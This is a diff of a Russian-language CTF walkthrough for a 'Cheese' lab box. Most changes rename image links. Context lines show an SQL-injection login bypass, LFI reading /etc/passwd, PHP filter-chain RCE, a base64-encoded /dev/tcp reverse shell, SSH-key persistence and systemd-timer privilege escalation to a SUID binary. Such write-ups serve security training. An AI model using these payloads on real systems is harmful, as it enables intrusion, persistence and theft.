@@ -1,4 +1,4 @@
-# Write-up: ABC / Flintstones (Web → LFI → RCE → PrivEsc)
+# Write-up: Cheese CTF (Web → LFI → RCE → PrivEsc)
 
 > В прохождении IP несколько раз менялся (`10.146.182.49`, `10.145.184.151` и т.д.). В своих шагах подставляйте актуальный адрес цели.
 
@@ -10,11 +10,11 @@
 ' || '1'='1' -- -
 ```
 
-![SQLi](img/Pasted image 20261014210834.png)
+![SQLi](img/Pasted_image_20261014210834.png)
 
 После этого попадаем на панель администратора:
 
-![Админ-панель](img/Pasted image 20261014132255.png)
+![Админ-панель](img/Pasted_image_20261014132255.png)
 
 ## 2. LFI через параметр `file`
 
@@ -30,7 +30,7 @@ http://10.146.182.49/secret-script.php?file=supersecretadminpanel.html
 http://10.146.182.49/secret-script.php?file=../../../../etc/passwd
 ```
 
-![LFI /etc/passwd](img/Pasted image 20261014132240.png)
+![LFI /etc/passwd](img/Pasted_image_20261014132240.png)
 
 Пробовал перебор путей через `ffuf`:
 
@@ -53,8 +53,8 @@ ffuf -w /usr/share/wordlists/seclist/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
 python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
 ```
 
-![Генерация phpinfo](img/Pasted image 20261014172417.png)
-![Выполнение phpinfo](img/Pasted image 20261014172352.png)
+![Генерация phpinfo](img/Pasted_image_20261014172417.png)
+![Выполнение phpinfo](img/Pasted_image_20261014172352.png)
 
 Затем генерируем цепочку для выполнения команд:
 
@@ -70,7 +70,7 @@ http://TARGET/secret-script.php?0=id&file=<сгенерированная_цеп
 
 Получаем RCE:
 
-![RCE id](img/Pasted image 20261014172944.png)
+![RCE id](img/Pasted_image 20261014172944.png)
 
 ## 4. Reverse shell
 
@@ -100,8 +100,8 @@ http://10.145.184.151/secret-script.php?0=echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGN
 
 На слушателе получаем шелл:
 
-![Reverse shell](img/Pasted image 20261014173707.png)
-![Шелл](img/Pasted image 20261014203933.png)
+![Reverse shell](img/Pasted_image_20261014173707.png)
+![Шелл](img/Pasted_image_20261014203933.png)
 
 ## 5. Закрепление через SSH
 
@@ -117,7 +117,7 @@ ssh-keygen
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTEAAAIDSbbGs8PgNCOBh4BC0Bjr8tJlqRVy8HZ3Fovc4ue roma@amor' >> authorized_keys
 ```
 
-![authorized_keys](img/Pasted image 20261014204646.png)
+![authorized_keys](img/Pasted_image_20261014204646.png)
 
 Теперь можно зайти по SSH.
 
@@ -125,19 +125,19 @@ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTEAAAIDSbbGs8PgNCOBh4BC0Bjr8tJlqRVy8HZ3Fovc4u
 
 Смотрим на юниты systemd:
 
-![systemd юниты](img/Pasted image 20261014205920.png)
+![systemd юниты](img/Pasted_image_20261014205920.png)
 
 `exploit.timer`:
 
-![exploit.timer](img/Pasted image 20261014205940.png)
+![exploit.timer](img/Pasted_image_20261014205940.png)
 
 В таймере не хватает секции `[Timer]` — дописываем её:
 
-![Дописанный таймер](img/Pasted image 20261014205853.png)
+![Дописанный таймер](img/Pasted_image_20261014205853.png)
 
 `exploit.service`:
 
-![exploit.service](img/Pasted image 20261014210547.png)
+![exploit.service](img/Pasted_image_20261014210547.png)
 
 По содержимому видно, что после срабатывания мы получим SUID-бинарь `xxd`.
 
@@ -148,8 +148,8 @@ sudo systemctl daemon-reload
 sudo systemctl restart exploit.timer
 ```
 
-![Перезапуск таймера](img/Pasted image 20261014210252.png)
+![Перезапуск таймера](img/Pasted_image_20261014210252.png)
 
 После срабатывания используем технику из GTFOBins для SUID `xxd`, чтобы прочитать `root.txt`:
 
-![Чтение root.txt](img/Pasted image 20261014210507.png)
+![Чтение root.txt](img/Pasted_image_20261014210507.png)
